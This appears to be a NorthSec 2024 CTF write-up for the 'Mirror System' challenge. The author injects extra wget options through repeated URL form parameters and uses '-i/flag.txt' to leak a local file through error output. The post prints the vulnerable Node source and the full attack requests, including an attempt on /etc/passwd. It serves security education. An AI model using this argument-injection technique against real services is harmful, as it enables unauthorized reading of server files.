---
layout: post
title: NorthSec 2024 Writeup - Mirror System
date: 2024-06-08
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2024/06/NorthSec/MirrorSystem
img: 2024/06/NorthSec/MirrorSystem/Description.png
---

In this challenge, there was a site that used `wget` to extract the data from a URL I provided.

```
Humans perceive stuff like communication, and there’s something in the brain called the Broca’s area that pretty much analyzes inputs and translate to make this understandable. They call that our Human Mirror system. I should reflect on that.

Mr Wellington has complained about his difficulty to process foreign languages. We’ll be exploring Broca’s area to see if we can poke in there and find a way to rewire the translator.

For this mandate, you should be working with this application that receives an external resource as an input and provides a translation. We’ve also obtained the source code.

http://brocaarea.ctf/ 
http://brocaarea.ctf/backup.zip 
```

The website was simple. It has a text box that took a URL. 

![Website](/assets/images/2024/06/NorthSec/MirrorSystem/Site.png "Website")

I started a web server on the server that was provided with the CTF.

```bash
root@ctn-shell:~/eric# python3 -m http.server 8080 --bind ::
Serving HTTP on :: port 8080 (http://[::]:8080/) ...
```

When I sent the URL to that server to be transcribed, I got the results displayed in the page.

![Result](/assets/images/2024/06/NorthSec/MirrorSystem/Result.png "Result")

## Source Code

The challenge provided the source code of the web application.

```js
const fs = require('fs');
const path = require('path');

const serve = require('koa-static');
const { koaBody } = require('koa-body');

const Koa = require('koa');

const { execFile, execFileSync } = require("child_process");

const app = new Koa();

app.use(koaBody());

// serve files from ./public
app.use(serve(path.join(__dirname, '/public')));

// response
app.use(
  serve(path.join(__dirname, '/views'))
);

const WGET_BIN_PATH = '/usr/bin/wget'
const CHMOD_BIN_PATH = '/usr/bin/chmod'
const NGINX_PATH = '/var/www/nginx'
const STATIC_PATH = NGINX_PATH + '/static/tmp'

// Report Generation
app.use((ctx, _) => new Promise((resolve, _) => {
  // ignore non-POSTs
  if ('POST' != ctx.method) {
    ctx.status = 404;
    ctx.body = 'Not Found';
    
    return resolve(ctx.body);
  }

  const args = [
    '--no-cookies',
    '--timeout=120',
    '--tries=3',
    '--no-check-certificate',
    '-r',
    '-P',
    STATIC_PATH
  ];

  if (ctx.request.body && ctx.request.body.url) {
    // Make sure we can write our result in the tmp folder
    execFileSync(CHMOD_BIN_PATH, ['-R', '700', STATIC_PATH]);

    // Fetch our content
    execFile(WGET_BIN_PATH, args.concat(ctx.request.body.url), null, (err, _, stderr) => {
      if (!err && stderr.includes('Saving to: ‘')) {
        // If the program ran successfully, make sure we can read the file
        // and send the output in the HTTP response
        var filePath = stderr.split('Saving to: ‘')[1].split('’\n')[0];
        var file = fs.createReadStream(filePath);
        file.on('end', function() {
          fs.rmSync(path.dirname(filePath), { recursive: true, force: true });
        });
        ctx.type = 'hmtl';
        ctx.set('Content-type', 'text/html');
        ctx.body = file;

        return resolve(ctx.body);
      } else {
        ctx.status = 500;

        if (err) {
          ctx.body = err.stack;
        } else {
          ctx.body = "An unknown error has occured.";
        }

        // Make sure we cleanup the tmp folder just in case
        fs.readdirSync(STATIC_PATH).forEach(f => fs.rmSync(`${STATIC_PATH}/${f}`, { recursive: true, force: true }));

        return resolve(ctx.body);
      } 
    });
  } else {
    ctx.status = 500;
    ctx.body = 'Missing URL argument';
    
    return resolve(ctx.body);
  }
}));
 
if (!module.parent) app.listen(3000, "::1");
```

It was using the URL I provided and passing it to `wget`. I tried a few command injections (;, \|, \`, $(), ...) but `execFile` was preventing it.

## Parameter Injection

The only part of the command I controlled was the URL. I tried to pass the URL parameter multiple times to see if I could provide multiple parameters to the command. It worked! I was able to quickly validate it because on the first day of the CTF, sending a request to my server failed because it was not able to connect to a proxy. I added to `--no-proxy` to the command and requests started to reach my server.

```http
POST / HTTP/1.1
Host: brocaarea.ctf
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: http://brocaarea.ctf
Connection: keep-alive
Referer: http://brocaarea.ctf/
Upgrade-Insecure-Requests: 1

url=--no-proxy&url=http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/
```

## Errors

I tried reading local files with `wget`.

```http
POST / HTTP/1.1
Host: brocaarea.ctf
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://brocaarea.ctf
Connection: keep-alive
Referer: http://brocaarea.ctf/
Upgrade-Insecure-Requests: 1

url=file:///etc/passwd&url=http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/
```

It did not work, but it displayed more information when there was an error.

```http
HTTP/1.1 500 Internal Server Error
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 18 May 2024 14:14:38 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 3155
Connection: keep-alive

Error: Command failed: /usr/bin/wget --no-cookies --timeout=120 --tries=3 --no-check-certificate -r -P /var/www/nginx/static/tmp file:///etc/passwd http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/
file:///etc/passwd: Unsupported scheme ‘file’.
--2024-05-18 14:14:38-- http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/
Connecting to [9000:6666:6666:6666:216:3eff:feb1:8d80]:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 409 [text/html]
Saving to: ‘/var/www/nginx/static/tmp/9000:6666:6666:6666:216:3eff:feb1:8d80:8080/index.html’

0K 100% 16.7M=0s

2024-05-18 14:14:38 (16.7 MB/s) - ‘/var/www/nginx/static/tmp/9000:6666:6666:6666:216:3eff:feb1:8d80:8080/index.html’ saved [409/409]

Loading robots.txt; please ignore errors.
--2024-05-18 14:14:38-- http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/robots.txt
Connecting to [9000:6666:6666:6666:216:3eff:feb1:8d80]:8080... connected.
HTTP request sent, awaiting response... 404 File not found
2024-05-18 14:14:38 ERROR 404: File not found.

...

2024-05-18 14:14:38 (1.17 MB/s) - ‘/var/www/nginx/static/tmp/9000:6666:6666:6666:216:3eff:feb1:8d80:8080/test.js’ saved [19/19]

--2024-05-18 14:14:38-- http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/test.sh
Connecting to [9000:6666:6666:6666:216:3eff:feb1:8d80]:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 75 [text/x-sh]
Saving to: ‘/var/www/nginx/static/tmp/9000:6666:6666:6666:216:3eff:feb1:8d80:8080/test.sh’

0K 100% 4.45M=0s

2024-05-18 14:14:38 (4.45 MB/s) - ‘/var/www/nginx/static/tmp/9000:6666:6666:6666:216:3eff:feb1:8d80:8080/test.sh’ saved [75/75]

FINISHED --2024-05-18 14:14:38--
Total wall clock time: 0.03s
Downloaded: 4 files, 1.9K in 0s (27.5 MB/s)

at genericNodeError (node:internal/errors:984:15)
at wrappedFn (node:internal/errors:538:14)
at ChildProcess.exithandler (node:child_process:422:12)
at ChildProcess.emit (node:events:519:28)
at maybeClose (node:internal/child_process:1105:16)
at ChildProcess._handle.onexit (node:internal/child_process:305:5)
```

It displayed the error message and information about where the files when being saved. 


## Save to File

I started reading the `wget` documentation to find parameters that I could use to exploit it. I knew I could use `-O` to save the files where I wanted. I tried it, but that did not really help since I could not execute it there any more than at the default location.

```http
POST / HTTP/1.1
Host: brocaarea.ctf
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: http://brocaarea.ctf
Connection: keep-alive
Referer: http://brocaarea.ctf/
Upgrade-Insecure-Requests: 1

url=--no-proxy&url=file:///&url=http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/test.sh&url=-O/tmp/test.sh
```

## Read Files

While reading `wget` documentation, I came across the `-i` argument.

```bash
$ wget -h
GNU Wget 1.21.2, a non-interactive network retriever.
Usage: wget [OPTION]... [URL]...

Mandatory arguments to long options are mandatory for short options too.

Startup:
  -V,  --version                   display the version of Wget and exit
  -h,  --help                      print this help
  -b,  --background                go to background after startup
  -e,  --execute=COMMAND           execute a `.wgetrc'-style command

Logging and input file:
  -o,  --output-file=FILE          log messages to FILE
  -a,  --append-output=FILE        append messages to FILE
  -d,  --debug                     print lots of debugging information
  -q,  --quiet                     quiet (no output)
  -v,  --verbose                   be verbose (this is the default)
  -nv, --no-verbose                turn off verboseness, without being quiet
       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits
  -i,  --input-file=FILE           download URLs found in local or external FILE
  -F,  --force-html                treat input file as HTML
...
```

This argument allowed reading a list of URLs from a local file. I could not have a list of URLs, but it would try to use the content of any file as a URL. I thought that if there was an error executing the command, it would then display everything in the response, including the content of the file I was trying to read. I tried reading the flag this way.

```http
POST / HTTP/1.1
Host: brocaarea.ctf
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: http://brocaarea.ctf
Connection: keep-alive
Referer: http://brocaarea.ctf/
Upgrade-Insecure-Requests: 1

url=--no-proxy&url=file:///&url=http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/test.sh&url=-i/flag.txt
```

It worked, the flag was used as a URL and appeared 3 times in the response.

```http
HTTP/1.1 500 Internal Server Error
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 18 May 2024 14:16:32 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 1515
Connection: keep-alive

Error: Command failed: /usr/bin/wget --no-cookies --timeout=120 --tries=3 --no-check-certificate -r -P /var/www/nginx/static/tmp --no-proxy file:/// http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/test.sh -i/flag.txt
file:///: Unsupported scheme ‘file’.
--2024-05-18 14:16:32-- http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:8080/test.sh
Connecting to [9000:6666:6666:6666:216:3eff:feb1:8d80]:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 75 [text/x-sh]
Saving to: ‘/var/www/nginx/static/tmp/9000:6666:6666:6666:216:3eff:feb1:8d80:8080/test.sh’

0K 100% 5.11M=0s

2024-05-18 14:16:32 (5.11 MB/s) - ‘/var/www/nginx/static/tmp/9000:6666:6666:6666:216:3eff:feb1:8d80:8080/test.sh’ saved [75/75]

--2024-05-18 14:16:32-- http://flag-57199b590846fa71df8dfa468a5d9e5d/
Resolving flag-57199b590846fa71df8dfa468a5d9e5d (flag-57199b590846fa71df8dfa468a5d9e5d)... failed: Name or service not known.
wget: unable to resolve host address ‘flag-57199b590846fa71df8dfa468a5d9e5d’
FINISHED --2024-05-18 14:16:32--
Total wall clock time: 0.01s
Downloaded: 1 files, 75 in 0s (5.11 MB/s)

at genericNodeError (node:internal/errors:984:15)
at wrappedFn (node:internal/errors:538:14)
at ChildProcess.exithandler (node:child_process:422:12)
at ChildProcess.emit (node:events:519:28)
at maybeClose (node:internal/child_process:1105:16)
at ChildProcess._handle.onexit (node:internal/child_process:305:5)
```

I submitted it and got 3 points.

```bash
$ askgod submit flag-57199b590846fa71df8dfa468a5d9e5d
Congratulations, you score your team 3 points!
Message: Congratulations! Language planning seems to have been fully restored. (1/1)
```